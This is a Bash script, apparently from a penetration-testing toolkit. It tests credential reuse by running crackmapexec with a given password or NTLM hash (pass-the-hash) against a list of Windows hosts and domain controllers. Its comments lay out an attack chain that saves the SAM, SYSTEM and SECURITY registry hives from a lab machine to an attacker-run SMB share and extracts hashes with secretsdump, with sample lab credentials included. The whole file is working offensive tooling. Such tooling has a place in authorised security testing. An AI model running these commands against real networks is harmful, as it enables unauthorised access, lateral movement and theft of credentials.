#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org
THREADS="30"
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
RESET='\e[0m'

#iptables -I INPUT -p icmp --icmp-type 8 -j DROP

while getopts ":u:h:p:f:" OPTIONS
do
            case $OPTIONS in            
            u)     USUARIO=$OPTARG;;
            h)     HASH=$OPTARG;;
            p)     PASSWORD=$OPTARG;;
			f)     FILE=$OPTARG;;
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

USUARIO=${USUARIO:=NULL}
HASH=${HASH:=NULL}
PASSWORD=${PASSWORD:=NULL}
FILE=${FILE:=NULL}

function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	find .enumeracion -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	insert-data.py
	mv .enumeracion/* .enumeracion2 2>/dev/null
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
	}
	

function print_ascii_art {
cat << "EOF"

╦  ┌─┐┌─┐┌─┐┬    ┌─┐┌┬┐┌┬┐┬┌┐┌  ┌─┐┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐
║  │ ││  ├─┤│    ├─┤ │││││││││  │  ├─┤├┤ │  ├┴┐├┤ ├┬┘
╩═╝└─┘└─┘┴ ┴┴─┘  ┴ ┴─┴┘┴ ┴┴┘└┘  └─┘┴ ┴└─┘└─┘┴ ┴└─┘┴└─

					daniel.torres@owasp.org
					https://github.com/DanielTorres1

EOF
}


#print_ascii_art
MIN_RAM=900;
MAX_SCRIPT_INSTANCES=15
if [ $USUARIO = NULL ] ; then
echo "|              														 			"
echo "| USO: local-admin-checker.sh -u [usuario] -h [hash] -p [password] -f [file] (opcional)"
echo "|																		 			"
echo ""
exit
fi

if [ $FILE = NULL ] ; then
	FILE='servicios_archived/WindowsAlive.txt	'
fi
#1) smbserver.py -smb2support share .
#2) reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.132\share'
#   reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SAM' -o '\\192.168.56.132\share'
#   reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SECURITY' -o '\\192.168.56.132\share'
#3) secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL
#   secretsdump -security SECURITY.save -system SYSTEM.save LOCAL # DCC2 (Domain Cached credentials 2 ) hashcat mode 2100
echo -e "$OKBLUE  USUARIO:$USUARIO HASH:$HASH PASSWORD:$PASSWORD FILE $FILE $RESET"

function checkRAM (){
	while true; do
		free_ram=`free -m | grep -i mem | awk '{print $7}'`		
		script_instancias=$((`ps aux | egrep 'webData|passWeb|crackmap' | wc -l` - 1)) 
		python_instancias=$((`ps aux | grep get_ssl_cert | wc -l` - 1)) 
		script_instancias=$((script_instancias + python_instancias))

		if [[ $free_ram -gt $MIN_RAM  && $script_instancias -lt $MAX_SCRIPT_INSTANCES  ]];then
			break
		else	
			echo "Poca RAM $MIN_RAM MB ($script_instancias scripts activos)"
			sleep 3 
		fi
	done
}
######################

for ip in $(cat $FILE); do
	echo -e "[+] $OKBLUE Testeando $ip .. $RESET"
	if [ "$PASSWORD" != NULL ] ; then
	#echo "PASSWORD $PASSWORD"				
		echo "Usando password $PASSWORD"
		crackmapexec smb $ip -u $USUARIO -p $PASSWORD --local-auth  | tee -a logs/cracking/"$ip"_smb_reusoPassword.txt & #local
		sleep 0.3
	else
		echo "Usando HASH $HASH"
		echo "crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth "
		crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth  | tee -a logs/cracking/"$ip"_smb_reusoPassword.txt & #local				
	fi	
done

while true; do
	crackmap_instancias=`ps aux | egrep 'crackmapexec' | wc -l`		
	if [ "$crackmap_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($crackmap_instancias)"				
		sleep 1
	else
		break		
	fi
done	# done true	

############# parse ############
for ip in $(cat $FILE); do
			
		################ user hacked ########
		grep -qai '+' logs/cracking/"$ip"_smb_reusoPassword.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then						
			echo -e "\t$OKRED[i] Reuso de password en ($ip) $RESET"
			if [ "$PASSWORD" != NULL ] ; then
				echo -e "Usuario:$USUARIO Pasword:$PASSWORD (local)" >> .vulnerabilidades/"$ip"_smb_reusoPassword.txt
			else
				echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH (local)" >> .vulnerabilidades/"$ip"_smb_reusoPassword.txt
			fi
			sed -i "/$ip/d" $FILE #borrar de la lista
		fi	
		################
done	


########### check domain controllers #####
DOMAIN_CONTROLERS=`ls logs/enumeracion/ | grep kerbrute_users.txt | cut -d '_' -f1`

for ip in $DOMAIN_CONTROLERS; do
	echo -e "[+] $OKBLUE Testeando controlador de dominio $ip .. $RESET"
	if [ "$PASSWORD" != NULL ] ; then			
		echo "Usando password $PASSWORD"
		crackmapexec smb $ip -u $USUARIO -p $PASSWORD  | tee -a logs/cracking/"$ip"_smb_reusoPassword2.txt #domain
	else
		echo "Usando HASH $HASH"
		echo "crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth "
		crackmapexec smb $ip -u $USUARIO -H $HASH | tee -a logs/cracking/"$ip"_smb_reusoPassword2.txt #domain
	fi

	grep -qai '+' logs/cracking/"$ip"_smb_reusoPassword2.txt 2>/dev/null
	greprc=$?
	if [[ $greprc -eq 0 ]] ; then						
		echo -e "\t$OKRED[i] Reuso de password en ($ip) $RESET"
		if [ "$PASSWORD" != NULL ] ; then
			echo -e "Usuario:$USUARIO Pasword:$PASSWORD (domain)" >> .vulnerabilidades/"$ip"_smb_reusoPassword.txt
		else
			echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH (domain)" >> .vulnerabilidades/"$ip"_smb_reusoPassword.txt
		fi
		sed -i "/$ip/d" $FILE #borrar de la lista
	fi	
done

insert_data
